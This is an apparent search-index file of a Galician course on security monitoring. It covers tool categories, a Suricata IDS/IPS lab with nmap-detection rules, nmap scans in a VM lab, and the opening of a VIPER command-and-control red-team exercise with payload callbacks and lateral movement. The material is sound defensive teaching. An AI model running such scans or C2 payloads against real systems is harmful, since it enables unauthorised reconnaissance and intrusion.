{"config":{"lang":["es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"De interese","text":"<p>LIMITACI\u00d3N DE RESPONSABILIDADE</p> <p>O autor do presente documento declina calquera responsabilidade asociada ao uso incorrecto e/ou malicioso que puidese realizarse coa informaci\u00f3n exposta no mesmo. Por tanto, non se fai responsable en ning\u00fan caso, nin pode ser considerado legalmente responsable en ning\u00fan caso, das consecuencias que poidan derivarse da informaci\u00f3n contida nel ou que est\u00e9 enlazada dende ou hacia el, inclu\u00edndo os posibles erros e informaci\u00f3n incorrecta existentes, informaci\u00f3n difamatoria, as\u00ed como das consecuencias que se poidan derivar sobre a s\u00faa aplicaci\u00f3n en sistemas de informaci\u00f3n reais e/ou virtuais. Este documento foi xerado para uso did\u00e1ctico e debe ser empregado en contornas privadas e virtuais controladas co permiso correspondente do administrador desas contornas.</p> <p>URLs de referencia</p> <ul> <li> <p>repoEDU-CCbySA - Material educativo - Licenza CC by SA - Repositorio </p> </li> <li> <p>repoEDU-CCbySA - Material educativo - Licenza CC by SA - Web </p> </li> <li> <p>Cheat-Sheet-Docker_A3</p> </li> <li> <p>Explicacion Cheat-Sheet-Docker_A3</p> </li> <li> <p>Suricata</p> </li> <li> <p>VIPER</p> </li> <li> <p>Ultimate IT SECURITY</p> </li> </ul> <p>Plantilla mkdocs</p> <ul> <li>Plantilla mkdocs material  baseada na personalizada por Fernando G\u00f3mez Folgar</li> </ul> <p>Aviso Legal</p> <p>Ricardo Feijoo Costa This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License </p>"},{"location":"ud4/clasificacion-ferramentas/","title":"Clasificaci\u00f3n de Ferramentas de Monitorizaci\u00f3n e Seguridade","text":"<p>Aqu\u00ed det\u00e1llanse as principais categor\u00edas de ferramentas usadas para a monitorizaci\u00f3n operacional e de seguridade:</p>"},{"location":"ud4/clasificacion-ferramentas/#monitorizacion-operacional","title":"Monitorizaci\u00f3n Operacional","text":"<ul> <li> <p>NMS (Network Monitoring System):     Un Sistema de Monitorizaci\u00f3n de Rede \u00e9 unha ferramenta ou conxunto de ferramentas dedicadas a supervisar o estado, dispo\u00f1ibilidade e rendemento dos dispositivos e enlaces de rede. Entre os elementos que pode monitorizar incl\u00faense routers, switches, interfaces, ancho de banda, latencia, etc. Adoitan empregar protocolos como SNMP.</p> <ul> <li>Ex: Nagios, Zabbix, PRTG Network Monitor, SolarWinds NPM, LibreNMS, Cacti.</li> </ul> </li> <li> <p>ITIM (IT Infrastructure Monitoring):     Abrangue a monitorizaci\u00f3n de toda a infraestrutura IT, inclu\u00edndo servidores (SO, CPU, memoria, disco), servizos, procesos, aplicaci\u00f3ns e bases de datos. O obxectivo \u00e9 detectar rapidamente calquera fallo ou comportamento an\u00f3malo que poida afectar \u00e1 dispo\u00f1ibilidade ou rendemento dos servizos IT.</p> <ul> <li>Ex: Nagios, Zabbix, Icinga, Checkmk, Prometheus + Grafana, Datadog.</li> </ul> </li> <li> <p>ITOM (IT Operations Management):     Representa unha categor\u00eda m\u00e1is ampla que engloba a xesti\u00f3n global das operaci\u00f3ns IT. Combina a monitorizaci\u00f3n (NMS/ITIM) con automatizaci\u00f3n de tarefas, xesti\u00f3n de incidencias, inventario, xesti\u00f3n de configuraci\u00f3ns e integraci\u00f3ns con sistemas de alerta ou helpdesk para optimizar a xesti\u00f3n da infraestrutura.</p> <ul> <li>Ex: ServiceNow ITOM, BMC Helix Operations Management, Micro Focus Operations Bridge. Moitas soluci\u00f3ns ITOM integran ferramentas de monitorizaci\u00f3n como Nagios ou Zabbix para a recolecci\u00f3n de datos.</li> </ul> </li> </ul>"},{"location":"ud4/clasificacion-ferramentas/#monitorizacion-e-xestion-de-seguridade","title":"Monitorizaci\u00f3n e Xesti\u00f3n de Seguridade","text":"<ul> <li> <p>SIEM (Security Information and Event Management):     Un sistema que agrega e analiza (correlaciona) logs e eventos de m\u00faltiples fontes (servidores, redes, firewalls, IDS/IPS, aplicaci\u00f3ns) para detectar ameazas de seguridade, investigar incidentes e xerar informes, ofrecendo unha visi\u00f3n centralizada da seguridade.</p> <ul> <li>Ex: Wazuh, Splunk, QRadar (IBM), Elastic SIEM (ELK Stack), Microsoft Sentinel.</li> </ul> </li> <li> <p>IDS (Intrusion Detection System):     Un sistema de detecci\u00f3n de intrusi\u00f3ns que monitorea o tr\u00e1fico de rede (NIDS) ou os eventos dun sistema (HIDS) para identificar actividades maliciosas ou anomal\u00edas e xerar alertas.</p> <ul> <li>Ex NIDS: Suricata (modo IDS), Snort (modo IDS), Zeek.</li> <li>Ex HIDS: Wazuh Agent, OSSEC, Elastic Agent (Fleet).</li> </ul> </li> <li> <p>IPS (Intrusion Prevention System):     Un sistema que non s\u00f3 detecta ataques (como un IDS), sen\u00f3n que tam\u00e9n pode bloquear ou mitigar automaticamente as ameazas en tempo real (NIPS ou HIPS).</p> <ul> <li>Ex NIPS: Suricata (modo inline), Snort (modo IPS), Firewalls de Nova Xeraci\u00f3n (NGFW).</li> <li>Ex HIPS: Wazuh Agent (con regras e resposta activa configuradas), Windows Defender (con pol\u00edticas de prevenci\u00f3n), Software Antivirus/Endpoint Security avanzado, iptables (con regras de bloqueo automatizadas).</li> </ul> </li> <li> <p>XDR (Extended Detection and Response):     Un sistema que ampl\u00eda a detecci\u00f3n e resposta fronte a ameazas mediante a integraci\u00f3n de m\u00faltiples fontes (endpoint, rede, identidade, cloud...), correlacionando eventos e aplicando resposta automatizada nunha soa plataforma centralizada.</p> <ul> <li>Ex: CrowdStrike Falcon XDR, Microsoft Defender XDR, Cortex XDR (Palo Alto), SentinelOne Singularity XDR.</li> </ul> <p>\ud83d\udec8 Nota sobre Wazuh e XDR: A\u00ednda que Wazuh non \u00e9 un XDR completo, integra funcionalidades clave como detecci\u00f3n en endpoint (HIDS), an\u00e1lise de logs (SIEM), resposta activa e reco\u00f1ecemento de vulnerabilidades, ofrecendo unha aproximaci\u00f3n s\u00f3lida a XDR en contornos locais. Non obstante, non incl\u00fae nativamente detecci\u00f3n en rede, identidade, correo ou nube, nin resposta orquestrada multicanle, polo que debe considerarse unha soluci\u00f3n SIEM/HIDS avanzada con capacidades EDR/HIPS, pero non un XDR integral.</p> </li> <li> <p>SOAR (Security Orchestration, Automation and Response):     Plataformas que permiten automatizar fluxos de traballo de seguridade, orquestrar ferramentas diversas (SIEM, EDR, ticketing, etc.) e executar respostas automatizadas fronte a incidentes, mellorando o tempo de resposta e a eficiencia operativa.</p> <ul> <li>Ex: Cortex XSOAR, Splunk SOAR, IBM Resilient, TheHive + Cortex.</li> </ul> </li> <li> <p>Diferenzas clave entre IDS e IPS:</p> <ul> <li>IDS: Detecta e alerta. Non bloquea activamente.</li> <li>IPS: Detecta e bloquea/prev\u00e9n activamente.</li> </ul> </li> <li>Nota sobre Suricata:<ul> <li>Por defecto act\u00faa como IDS (modo pasivo, s\u00f3 xera alertas).</li> <li>En modo inline (ex: con <code>NFQUEUE</code>), pode funcionar como IPS, bloqueando tr\u00e1fico malicioso segundo as regras configuradas.</li> </ul> </li> </ul>"},{"location":"ud4/clasificacion-ferramentas/#resumo-visual-da-clasificacion","title":"Resumo visual da clasificaci\u00f3n","text":""},{"location":"ud4/nagios/","title":"Pr\u00e1cticas Monitorizaci\u00f3n","text":"<p>De interese</p> <ul> <li>repoEDU-CCbySA - BRS - Monitorizaci\u00f3n <pre><code>$ tree Monitorizacion/Operacional\nMonitorizacion/Operacional/\n.\n\u251c\u2500\u2500 1-Taller-BRS-Practica-Nagios_pageNumbers.pdf\n</code></pre></li> </ul> <p>Hash</p> <ul> <li>Taller BRS Pr\u00e1ctica Nagios</li> </ul>"},{"location":"ud4/suricata/","title":"Suricata","text":""},{"location":"ud4/suricata/#introducion","title":"Introduci\u00f3n","text":"<p>Neste documento describirase como implementar e integrar Suricata nun escenario con m\u00e1quinas virtuais usando VirtualBox. Este escenario permite a detecci\u00f3n, an\u00e1lise, e visualizaci\u00f3n de tr\u00e1ficos de rede sospeitosos con Suricata inclu\u00edndo acci\u00f3ns autom\u00e1ticas en resposta a alertas cr\u00edticas.</p> <p>Que son IDS, IPS e resposta a incidentes?</p> <ul> <li> <p>IDS (Intrusion Detection System):   Un sistema de detecci\u00f3n de intrusi\u00f3ns que monitorea o tr\u00e1fico de rede ou os eventos dun sistema para identificar actividades maliciosas ou anomal\u00edas. Tipos de IDS:</p> <ul> <li>NIDS (Network IDS): Monitoriza o tr\u00e1fico da rede en tempo real.<ul> <li>Suricata \u2192 Motor de detecci\u00f3n baseado en sinaturas (modo IDS por defecto).</li> <li>Zeek \u2192 Analiza e rexistra o comportamento da rede.</li> </ul> </li> <li>HIDS (Host IDS): Monitoriza eventos en dispositivos individuais (hosts).<ul> <li>Elastic Agent (Fleet) \u2192 Analiza rexistros do sistema e eventos de seguridade nos hosts.</li> </ul> </li> </ul> </li> <li> <p>IPS (Intrusion Prevention System):   Un sistema que non s\u00f3 detecta ataques (como un IDS), sen\u00f3n que tam\u00e9n pode bloquear ou mitigar automaticamente as ameazas antes de que afecten o sistema. Tipos de IPS: </p> <ul> <li>NIPS (Network-based IPS): Monitoriza e bloquea tr\u00e1fico malicioso na rede antes de que chegue aos hosts.  <ul> <li>Suricata en modo inline (AF_PACKET ou NFQUEUE)  </li> <li>Snort configurado como IPS  </li> </ul> </li> <li>HIPS (Host-based IPS): Funciona directamente en dispositivos finais (hosts), bloqueando procesos ou conexi\u00f3ns perigosas.  <ul> <li>Windows Defender con pol\u00edticas de prevenci\u00f3n  </li> <li>iptables con regras de detecci\u00f3n automatizadas  </li> </ul> </li> </ul> </li> </ul> <p>Diferencias entre IDS e IPS: - IDS: S\u00f3 detecta ataques e xera alertas, pero non bloquea o tr\u00e1fico. - IPS: Detecta e bloquea tr\u00e1fico malicioso en tempo real.  </p> <p>Suricata pode funcionar como IDS ou IPS segundo a s\u00faa configuraci\u00f3n: - Por defecto act\u00faa como IDS (modo pasivo, s\u00f3 xera alertas). - En modo inline (por exemplo con <code>NFQUEUE</code>), pode funcionar como IPS, bloqueando tr\u00e1fico malicioso segundo as regras configuradas.  </p>"},{"location":"ud4/suricata/#escenario","title":"Escenario","text":""},{"location":"ud4/suricata/#maquinas-virtuais-virtualbox-debian-12","title":"M\u00e1quinas virtuais (VirtualBox) Debian 12","text":"<ul> <li>VM1: Suricata (Detector de tr\u00e1fico e xerador de logs)  </li> <li>VM2: Escaneo de portos mediante nmap</li> <li>Rede: <ul> <li>NIC1 (enp0s3): NAT (conectividade \u00e1 Internet)  </li> <li>NIC2 (enp0s8): Rede Interna \"intnet\" para comunicaci\u00f3n entre VM1 e VM2 \u2192 192.168.120.0/24  </li> <li>VM1 (Suricata): IP est\u00e1tica <code>192.168.120.100/24</code> </li> <li>VM2 (nmap): IP est\u00e1tica <code>192.168.120.200/24</code> </li> </ul> </li> <li>CPU: 2  </li> <li>RAM: 4GB  </li> <li>Disco duro: 20GB din\u00e1mico</li> </ul>"},{"location":"ud4/suricata/#vm1-configuracion-de-suricata","title":"VM1: Configuraci\u00f3n de Suricata","text":"<ul> <li> <p>Configuraci\u00f3n b\u00e1sica: <pre><code>apt install suricata -y\nsuricata-update\nls /var/lib/suricata/rules/\nsed -E -i 's|(default-rule-path:).*|\\1 /var/lib/suricata/rules|' /etc/suricata/suricata.yaml\n</code></pre> Editar en <code>/etc/suricata/suricata.yaml</code> <pre><code>af-packet:\n  - interface: enp0s8  # substit\u00fae \"eth0\" pola interface correcta\n    threads: auto\n    cluster-id: 99\n    cluster-type: cluster_flow\n    defrag: yes\n#Activar IPS en Suricata\naction-order:\n  - pass   \n  - drop\n  - reject\n  - alert\n</code></pre></p> </li> <li> <p>Configuraci\u00f3n de rede: <pre><code>pkill NetworkManager\nip addr add 192.168.120.100/24 dev enp0s8\nip link set enp0s8 up\n</code></pre></p> </li> <li> <p>Logs: Executar noutra consola de <code>root</code>: <pre><code>tail -f /var/log/suricata/fast.log\n</code></pre></p> </li> <li> <p>Reiniciar Suricata para aplicar os cambios <pre><code>systemctl restart suricata || suricata -c /etc/suricata/suricata.yaml -i enp0s8\n</code></pre></p> </li> </ul>"},{"location":"ud4/suricata/#diagrama-de-funcionamento","title":"Diagrama de funcionamento","text":""},{"location":"ud4/suricata/#_1","title":"Suricata","text":""},{"location":"ud4/suricata/#suricata-regras-personalizadas-e-probas-de-deteccion","title":"Suricata: Regras Personalizadas e Probas de Detecci\u00f3n","text":"<p>Esta secci\u00f3n recolle os pasos e boas pr\u00e1cticas para traballar con regras personalizadas en Suricata, evitando sobrescrici\u00f3ns por parte de <code>suricata-update</code>, e asegurando a correcta detecci\u00f3n de eventos durante as probas de seguridade.</p>"},{"location":"ud4/suricata/#obxectivo","title":"Obxectivo","text":"<ul> <li>Configurar regras personalizadas sen que se borren ao actualizar.</li> <li>Verificar que as regras se cargan e funcionan correctamente.</li> </ul>"},{"location":"ud4/suricata/#pasos-esenciais","title":"Pasos Esenciais","text":""},{"location":"ud4/suricata/#1-evitar-sobrescricion-de-regras","title":"1. Evitar sobrescrici\u00f3n de regras","text":"<p>O ficheiro <code>suricata.rules</code> pode ser sobrescrito por <code>suricata-update</code>. Para evitar isto:</p> <ul> <li>Crea o teu ficheiro personalizado: <code>/var/lib/suricata/rules/custom.rules</code></li> <li>Define no <code>suricata.yaml</code>:   <pre><code>rule-files:\n  - suricata.rules\n  - custom.rules\n</code></pre></li> <li>Aseg\u00farate de que <code>custom.rules</code> vai despois de <code>suricata.rules</code>.</li> </ul>"},{"location":"ud4/suricata/#2-lanza-suricata-en-modo-manual","title":"2. Lanza Suricata en modo manual","text":"<p>Desactiva o servizo: <pre><code>systemctl stop suricata\nsystemctl status suricata --no-pager\n</code></pre></p> <p>Lanza Suricata directamente sobre a interface: <pre><code>suricata -i enp0s8 -c /etc/suricata/suricata.yaml -v\n</code></pre></p>"},{"location":"ud4/suricata/#3-verifica-as-alertas","title":"3. Verifica as alertas","text":"<p>Noutro terminal: <pre><code>tail -f /var/log/suricata/fast.log\n</code></pre></p> <p>Verifica que aparecen alertas no log (<code>fast.log</code>) cando executas acci\u00f3ns dende outras m\u00e1quinas.</p>"},{"location":"ud4/suricata/#nota-sobre-regras-e-home_net","title":"Nota sobre regras e HOME_NET","text":"<p>Moitas regras usan variables como <code>$HOME_NET</code>, definidas en <code>suricata.yaml</code>:</p> <pre><code>vars:\n  address-groups:\n    HOME_NET: [192.168.120.0/24]\n</code></pre> <p>Se est\u00e1s traballando nun contorno de laboratorio onde o tr\u00e1fico \u00e9 interno, e non se detectan alertas, pode ser \u00fatil crear regras m\u00e1is abertas:</p> <pre><code>alert tcp any any -&gt; any any (msg:\"NMAP Scan Detectado\"; flags:S; threshold:type threshold, track by_src, count 5, seconds 60; sid:1000002; rev:1;)\n</code></pre> <p>En vez de: <pre><code>alert tcp any any -&gt; $HOME_NET any (msg:\"NMAP Scan Detectado\"; flags:S; threshold:type threshold, track by_src, count 5, seconds 60; sid:1000002; rev:1;)\n</code></pre></p> <p>A primeira regra captura escaneos en calquera direcci\u00f3n, mentres que a segunda s\u00f3 o far\u00e1 se o destino \u00e9 a rede definida como <code>$HOME_NET</code>.</p>"},{"location":"ud4/suricata/#explicacion-da-estrutura-dunha-regra","title":"Explicaci\u00f3n da estrutura dunha regra","text":"<p>Exemplo: <pre><code>alert tcp any any -&gt; $HOME_NET any (msg:\"NMAP Scan Detectado\"; flags:S; threshold:type threshold, track by_src, count 5, seconds 60; sid:1000002; rev:1;)\n</code></pre></p> Campo Significado <code>alert</code> Acci\u00f3n: xerar unha alerta <code>tcp</code> Protocolo TCP (poder\u00eda ser udp, icmp...) <code>any</code> (IP orixe) Calquera IP de orixe <code>any</code> (porto orixe) Calquera porto de orixe <code>-&gt;</code> Direcci\u00f3n do fluxo do tr\u00e1fico <code>$HOME_NET</code> (IP dest.) Rede interna definida no <code>suricata.yaml</code> <code>any</code> (porto destino) Calquera porto de destino <code>msg:\"...\"</code> Mensaxe da alerta <code>flags:S</code> Coincidencia con paquetes SYN (inicio de conexi\u00f3n TCP) <code>threshold</code> Regras de frecuencia: se detecta 5 SYNs en 60 segundos do mesmo orixe, lanza alerta <code>sid:1000002</code> ID \u00fanico da regra (Suricata ID) <code>rev:1</code> Revisi\u00f3n da regra"},{"location":"ud4/suricata/#conclusion","title":"Conclusi\u00f3n","text":"<p>Unha correcta definici\u00f3n de regras, xesti\u00f3n do seu ficheiro, e interpretaci\u00f3n da rede (<code>$HOME_NET</code>) \u00e9 esencial para que Suricata funcione correctamente.</p> <p>A combinaci\u00f3n de <code>suricata -i ...</code> + <code>tail -f fast.log</code> \u00e9 clave nas fases de desenvolvemento e probas.</p> <p>Unha vez verificado que todo funciona correctamente, podes volver a arrancar o servizo: <pre><code>systemctl start suricata\nsystemctl status suricata --no-pager\n</code></pre></p>"},{"location":"ud4/suricata/#exemplo-1-suricata-como-ids","title":"Exemplo 1: Suricata como IDS","text":"<p>Para ilustrar este proceso, suporemos que Suricata en VM1 detecta un escaneo de portos realizado desde VM2 (a cal simula unha m\u00e1quina externa).</p>"},{"location":"ud4/suricata/#vm2-xeracion-dunha-alerta-en-vm1-suricata","title":"VM2: Xeraci\u00f3n dunha alerta en VM1 (Suricata)","text":"<p>Executa os seguintes comandos dende VM2 para simular un escaneo de portos: <pre><code>apt update &amp;&amp; apt -y install nmap\npkill NetworkManager\nip addr add 192.168.120.200/24 dev enp0s8\nip link set enp0s8 up\n</code></pre></p> <p>VM1: Regras que detectan nmap</p> <p>Suricata est\u00e1 cargando regras que detectan <code>nmap</code>, pero est\u00e1n desactivadas (comentadas con <code>#</code>). As regras comentadas non se aplican, polo que hai que activalas:  </p> <p>1. Definir <code>$HOME_NET</code> en <code>/etc/suricata/suricata.yaml</code>: <pre><code>HOME_NET: \"[192.168.120.0/24]\"\n</code></pre></p> <p>2. Regras nmap: </p> <p>OPCI\u00d3N 1: Editar o ficheiro de regras <code>suricata.rules</code></p> <p>Abre o ficheiro de regras para edici\u00f3n <code>/var/lib/suricata/rules/suricata.rules</code>. Busca e descomenta as li\u00f1as que te\u00f1en que ver con <code>NMAP</code> ou <code>SCAN</code>. As m\u00e1is importantes son:</p> <pre><code>alert tcp $EXTERNAL_NET any -&gt; $HOME_NET any (msg:\"ET SCAN NMAP -sS window 2048\"; fragbits:!D; dsize:0; flags:S,12; ack:0; window:2048; threshold: type both, track by_dst, count 1, seconds 60; classtype:attempted-recon; sid:2000537; rev:8;)\n\nalert ip $EXTERNAL_NET any -&gt; $HOME_NET any (msg:\"ET SCAN NMAP -sO\"; dsize:0; ip_proto:21; threshold: type both, track by_dst, count 1, seconds 60; classtype:attempted-recon; sid:2000536; rev:7;)\n\nalert tcp $EXTERNAL_NET any -&gt; $HOME_NET any (msg:\"ET SCAN NMAP -sA (1)\"; fragbits:!D; dsize:0; flags:A,12; window:1024; threshold: type both, track by_dst, count 1, seconds 60; classtype:attempted-recon; sid:2000538; rev:8;)\n\nalert tcp $EXTERNAL_NET any -&gt; $HOME_NET any (msg:\"ET SCAN NMAP -f -sF\"; fragbits:!M; dsize:0; flags:F,12; ack:0; window:2048; threshold: type both, track by_dst, count 1, seconds 60; classtype:attempted-recon; sid:2000543; rev:7;)\n</code></pre> <p>Aseg\u00farate de que estas li\u00f1as NON te\u00f1en <code>#</code> diante.</p> <p>Podes realizar os seguintes comandos para a edici\u00f3n autom\u00e1tica: <pre><code>   apt -y install moreutils\n   grep -i 'et scan nmap' /var/lib/suricata/rules/suricata.rules  | sed 's|^# | |' | sponge /var/lib/suricata/rules/suricata.rules\n</code></pre></p> <p><code>suricata-update</code> sobreescribe o ficheiro <code>/var/lib/suricata/rules/suricata.rules</code></p> <p></p> <p>OPCI\u00d3N 2: Xerar o ficheiro <code>custom.rules</code> </p> <ul> <li>Define no <code>suricata.yaml</code>:   <pre><code>rule-files:\n  - suricata.rules\n  - custom.rules\n</code></pre></li> <li> <p>Aseg\u00farate de que <code>custom.rules</code> vai despois de <code>suricata.rules</code>.</p> </li> <li> <p>Crea o teu ficheiro personalizado <code>/var/lib/suricata/rules/custom.rules</code> co seguinte contido: <pre><code># alert tcp any any -&gt; any any (msg:\"NMAP Scan Detectado\"; flags:S; threshold:type threshold, track by_src, count 5, seconds 60; sid:1000002; rev:1;)\nalert tcp any any -&gt; $HOME_NET any (msg:\"NMAP Scan Detectado\"; flags:S; threshold:type threshold, track by_src, count 5, seconds 60; sid:1000002; rev:1;)\n</code></pre></p> </li> </ul> <p>3. Actualizar as regras de Suricata e reiniciar</p> <p>Executa unicamente o seguinte comando se est\u00e1s a empregar a anterior OPCI\u00d3N 2:  <pre><code>suricata-update\n</code></pre></p> <p>Independentemente da opci\u00f3n escollida executa:</p> <pre><code>systemctl stop suricata\nsystemctl status suricata --no-pager\nsuricata -c /etc/suricata/suricata.yaml -i enp0s8\n</code></pre> <p>Suricata detectar\u00e1 isto e rexistrar\u00e1 a alerta no ficheiro <code>/var/log/suricata/fast.log</code>.</p> <p>VM2 Executa: <pre><code>nmap -sS 192.168.120.100\n</code></pre></p> <p>VM1 </p> <ul> <li>Agora Suricata deber\u00eda detectar o escaneo de <code>nmap</code> (<code>-sS</code>) e rexistralo en <code>fast.log</code> e <code>eve.json</code>.  </li> <li>Tam\u00e9n deber\u00edas ver as regras aplicadas en <code>suricata.log</code> (verificar que cargou as regras correctamente).</li> <li>Agora que est\u00e1n funcionando as novas regras executa: <pre><code>pkill suricata\nsystemctl start suricata\nsystemctl status suricata --no-pager\n</code></pre></li> </ul>"},{"location":"ud4/suricata/#exemplo-2-suricata-como-ips","title":"Exemplo 2: Suricata como IPS","text":""},{"location":"ud4/suricata/#podese-reaccionar-desde-vm1","title":"P\u00f3dese reaccionar desde VM1?","text":"<p>NIDS vs NIPS</p> <ol> <li> <p>Detecci\u00f3n \u2260 Prevenci\u00f3n (por defecto)    Suricata \u00e9 por defecto un NIDS (sistema de detecci\u00f3n), non NIPS (sistema de prevenci\u00f3n). A\u00ednda que detecta o tr\u00e1fico, non o bloquea salvo que estea funcionando en modo inline.</p> </li> <li> <p>\u00c9 Suricata un NIDS ou NIPS na t\u00faa configuraci\u00f3n?    Para que <code>drop</code> funcione, Suricata ten que estar en modo inline (IPS). Para iso, debe estar nunha interface con soporte a NFQUEUE (en Linux) e cunha regra de iptables que reenv\u00ede paquetes a esa cola.</p> </li> </ol> <p>Si, configurando Suricata en modo IPS pode bloquear paquetes directamente, permitindo reacci\u00f3n inmediata:</p> <ul> <li> <p>Activar IPS en Suricata:</p> <ol> <li> <p>Engadir regra de <code>iptables</code> para reenviar os paquetes ao motor de <code>suricata</code> para que poida bloquear:    <pre><code>apt update &amp;&amp; apt -y install iptables\niptables -L -v -n\niptables -I INPUT -j NFQUEUE --queue-num 0 \niptables -I FORWARD -j NFQUEUE --queue-num 0 \niptables -I OUTPUT -j NFQUEUE --queue-num 0 \niptables -L -v -n\n</code></pre> <code>A opci\u00f3n --queue-num 0 debe coincidir co que indicar\u00e1s ao lanzar Suricata.</code>  Facer que as regras <code>iptables</code> sexan persistentes tras un reinicio: <pre><code>apt -y install iptables-persistent\nnetfilter-persistent save\n</code></pre></p> </li> <li> <p>Asegurar que as regras relevantes en <code>custom.rules</code> din <code>drop</code> e non any. Por exemplo:    <pre><code>drop tcp any any -&gt; any any (msg:\"NMAP Scan Detectado\"; sid:1000002; ...)\n</code></pre>    As\u00ed, podes executar o comando: <pre><code>#sed -i 's|^alert|drop|' /var/lib/suricata/rules/custom.rules\nsed -i 's|^alert|#alert|' /var/lib/suricata/rules/custom.rules\necho 'drop tcp any any -&gt; $HOME_NET any (flags:S; msg:\"Bloqueo total de SYN\"; sid:1000003; rev:1;)\n&gt;&gt; /var/lib/suricata/rules/custom.rules\n</code></pre></p> </li> <li> <p>Aseg\u00farate de que <code>action-order</code> est\u00e1 correctamente configurado no <code>suricata.yaml</code>:    <pre><code>action-order:\n  - drop\n  - reject\n  - alert\n</code></pre></p> </li> <li> <p>Lanzar Suricata as\u00ed:    <pre><code>systemctl stop suricata\nsystemctl status suricata | tee \nsuricata -c /etc/suricata/suricata.yaml -q 0 -i enp0s8\n</code></pre></p> </li> </ol> <p>Agora Suricata bloquear\u00e1 automaticamente tr\u00e1fico malicioso segundo as regras configuradas. As\u00ed, se executamos de novo o comando nmap en VM2 deber\u00edan filtrarse os portos: <pre><code>nmap -sS 192.168.120.100\nStarting Nmap 7.93 ( https://nmap.org ) at 2025-04-11 00:13 CEST\nNmap scan report for 192.168.120.100 (192.168.120.100)\nHost is up (0.0011s latency).\nAll 1000 scanned ports on 192.168.120.100 (192.168.120.100) are in ignored states.\nNot shown: 1000 filtered tcp ports (no-response)\nMAC Address: 08:00:27:F7:D7:80 (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 22.05 seconds\n</code></pre> E non se filtrar\u00e1 tr\u00e1fico non malicioso, como o comando ping: <pre><code>ping -c2 192.168.120.100\nPING 192.168.120.100 (192.168.120.100) 56(84) bytes of data.\n64 bytes from 192.168.120.100: icmp_seq=1 ttl=64 time=1.05 ms\n64 bytes from 192.168.120.100: icmp_seq=2 ttl=64 time=1.22 ms\n\n--- 192.168.120.100 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1001ms\nrtt min/avg/max/mdev = 1.045/1.130/1.216/0.085 ms\n</code></pre></p> </li> </ul>"},{"location":"ud4/suricata/#conclusion-adicional-importante","title":"Conclusi\u00f3n adicional importante:","text":"<ul> <li>Si, Suricata pode reaccionar directamente desde VM1, sempre que as regras necesarias estean configuradas e activas, permitindo bloquear inmediatamente intentos co\u00f1ecidos como escaneos realizados con nmap desde m\u00e1quinas externas (por exemplo, VM2).</li> </ul>"},{"location":"ud4/viper/","title":"Bastionado e Simulaci\u00f3n de Ataques con VIPER","text":""},{"location":"ud4/viper/#escenario","title":"Escenario","text":"<p>Contorna: 3 m\u00e1quinas virtuais (VMs) Oracle VirtualBox             \u2192 2 m\u00e1quinas virtuais executando Debian 12: VM-1 e VM-2             \u2192 1 m\u00e1quina virtual executando Microsoft Windows 10: VM-3</p> <ul> <li>VM-1 (Atacante):<ul> <li>Rol: Servidor de Comando e Control (C2).</li> <li>Software Principal: Instalaci\u00f3n base est\u00e1ndar de Debian 12 e VIPER</li> <li>Prop\u00f3sito: Administrar os payloads/axentes, enviar tarefas e recoller informaci\u00f3ndas m\u00e1quinas v\u00edtimas.</li> <li>Rede: <ul> <li>NIC1: NAT</li> <li>NIC2: Rede Interna \u2192 192.168.120.100/24  </li> </ul> </li> <li>CPU: 2</li> <li>RAM: 4GB</li> <li>Disco duro: 20GB din\u00e1mico</li> </ul> </li> </ul> <ul> <li>VM-2 (V\u00edtima a trav\u00e9s de payload):<ul> <li>Rol: Sistema obxectivo simulado.</li> <li>Software Inicial: Instalaci\u00f3n base est\u00e1ndar de Debian 12.</li> <li>Prop\u00f3sito: Executar payload xerado por Viper, o cal establecer\u00e1 unha conexi\u00f3n de volta (callback) cara \u00e1 VM Atacante (C2).</li> <li>Rede: <ul> <li>NIC1: NAT</li> <li>NIC2: Rede Interna \u2192 192.168.120.101/24  </li> </ul> </li> <li>CPU: 2</li> <li>RAM: 4GB</li> <li>Disco duro: 20GB din\u00e1mico</li> </ul> </li> </ul> <ul> <li>VM-3 (V\u00edtima a trav\u00e9s de movemento lateral):<ul> <li>Rol: Sistema obxectivo simulado.</li> <li>Software Inicial: Instalaci\u00f3n base est\u00e1ndar de Microsoft Windows 10.</li> <li>Prop\u00f3sito: Executar m\u00f3dulo en Viper, o cal establecer\u00e1 unha conexi\u00f3ndende VM-2 a esta m\u00e1quina virtual e de volta (callback) cara \u00e1 VM Atacante (C2).</li> <li>Rede: <ul> <li>NIC1: NAT</li> <li>NIC2: Rede Interna \u2192 192.168.120.102/24  </li> </ul> </li> <li>CPU: 2</li> <li>RAM: 4GB</li> <li>Disco duro: 20GB din\u00e1mico</li> </ul> </li> </ul> <p>Tempo execuci\u00f3n payload: 30 minutos</p> <p>Ver VIPER Pricing Unha das limitaci\u00f3ns que pos\u00fae a versi\u00f3n COMMUNITY que imos empregar \u00e9 que cada sesi\u00f3n establecida coa m\u00e1quina v\u00edtima ten unha limitaci\u00f3n de 30 minutos. Polo tanto isto hai que telo en conta para a realizaci\u00f3n desta pr\u00e1ctica xa que pode ser que a/s conexi\u00f3n/s remate/n e haxa que crear outra/s, cambiando as\u00ed os PIDs dos procesos executados e os portos da/s conexi\u00f3n/s establecida/s.</p>"},{"location":"ud4/viper/#introducion","title":"Introduci\u00f3n","text":"<p>Importancia de VIPER, Red Team e Blue Team para o Bastionado de Redes e Sistemas</p> <p>Nos \u00faltimos anos, o uso de ferramentas avanzadas de Red Teaming como VIPER converteuse nun est\u00e1ndar na industria da ciberseguridade.</p> <ul> <li>Red Team: Son equipos de ciberseguridade ofensiva que te\u00f1en como obxectivo identificar vulnerabilidades en infraestruturas, sistemas e aplicaci\u00f3ns empregando t\u00e9cnicas similares \u00e1s utilizadas por atacantes reais (APT's - Advanced Persistent Threats).</li> <li>Blue Team: Son equipos defensivos encargados de protexer, monitorizar e responder a posibles ataques. O seu traballo incl\u00fae mellorar as defensas, aplicar contramedidas e manter a seguridade da infraestrutura.</li> <li>VIPER: \u00c9 unha ferramenta dese\u00f1ada para simular ataques avanzados de forma flexible e modular. Permite realizar movemento lateral, evasi\u00f3n de detecci\u00f3ns, exfiltraci\u00f3n de datos e comunicaci\u00f3ns encubertas (C2), o que resulta crucial para comprender como mellorar o bastionado de redes. VIPER pode conectarse con Metasploit Framework, permitindo lanzar explotaci\u00f3ns, escalar privilexios e executar cargas \u00fatiles(payloads) directamente desde Metasploit, mantendo o control centralizado dentro do panel 